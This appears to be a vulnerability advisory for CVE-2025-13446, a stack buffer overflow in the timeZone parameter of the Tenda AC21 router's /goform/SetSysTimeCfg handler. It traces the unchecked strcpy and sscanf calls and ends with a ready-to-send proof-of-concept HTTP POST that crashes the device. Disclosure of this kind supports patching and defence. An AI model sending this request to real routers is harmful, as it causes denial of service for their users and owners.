------
### **CVE-2025-13446**

**Affected Product**: Tenda AC21 Router

**Affected Firmware Versions**:  V16.03.08.16

**Vulnerability Type**: Buffer Overflow Vulnerability

**Organization**: School of Cybersecurity, Northwestern Polytechnical University

**Author**: 邱佳慧 毛伯敏 郭鸿志

------
### **Vulnerability Description**

In the latest firmware version V16.03.08.16 for the Tenda AC21 router, the `timeZone` parameter of `/goform/SetSysTimeCfg` in the `/bin/httpd` binary contains a stack-based buffer overflow vulnerability that can lead to denial‑of‑service and potentially remote command execution.


---
### **Vulnerability Details**

In the httpd binary, the function corresponding to **`/goform/SetSysTimeCfg`** is **`fromSetSysTime`**.
![1](./img/35.png)

In the `fromSetSysTime` function, the `sub_496104` function is invoked.
![2](./img/36.png)

In the `sub_496104` function there are multiple stack-based buffer overflow points: calls to `strcpy` and `sscanf` do not enforce maximum input lengths, which can allow attacker-controlled data to overwrite stack memory and lead to crashes or potential code execution.
![3](./img/37.png)


---
### **PoC**
```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.254.139
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 146
Origin: http://192.168.254.139
Connection: keep-alive
Priority: u=0

timeZone=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa58aaaaaaaaaaaa
```

By sending this poc, an attacker can achieve the effect of a denial-of-service(DOS) attack .
![4](./img/38.png)
![5](./img/39.png)
